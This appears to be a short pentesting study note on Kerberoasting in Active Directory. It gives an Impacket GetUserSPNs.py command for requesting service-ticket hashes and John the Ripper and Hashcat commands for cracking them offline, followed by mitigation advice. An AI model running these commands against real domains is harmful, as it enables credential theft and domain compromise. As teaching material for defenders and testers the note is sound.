# **Kerberoasting**

In Kerberoasting, an attacker requests a Service Ticket for a Service Principal Name (SPN). The attacker can then extract and crack the service account's password hash offline. This is effective because service accounts often have high privileges and weaker passwords that are less frequently changed.

Kerberoasting is an attack method for cracking password hashes for service accounts in Active Directory.

###########################################################################################

# **Process of Attack**

## **Step 1:**

```
./GetUserSPNs.py pkdc.local/mssql -dc-ip 192.168.0.47 -request
```

![[Pasted image 20251219195118.png]]

_with this command it will grab the Hash which we can crack with tools like Hashcat and John._

_________________

# **Cracking the Hash**

“**JohnTheRipper**” COMMAND:

```
john hash_file
```

![[Pasted image 20251219195125.png]]

_________________

“**Hashcat**” COMMAND ⇒ 
```
hashcat -m 13100 hash_file rockyou.txt
```

![[Pasted image 20251219195159.png]]

# **Mitigation**

Use the strong and complex passwords on Service Accounts, like 20 characters and 30 Characters. Use the MSA (Managed Service Account) instead of these custom user accounts, because the Managed Service Accounts have really long and complex passwords set to it and they are maintained automatically by the Active Directory. Implement the Least privilege principle, don't run the Service Accounts as Domain Admins because if they are compromised then the attacker can directly get the High Privileges over the Domain. This is a Feature of a Kerberos Authentication Protocol. So, there is nothing we can do except these security measures mentioned above.

MSA Detailed Reference [https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009)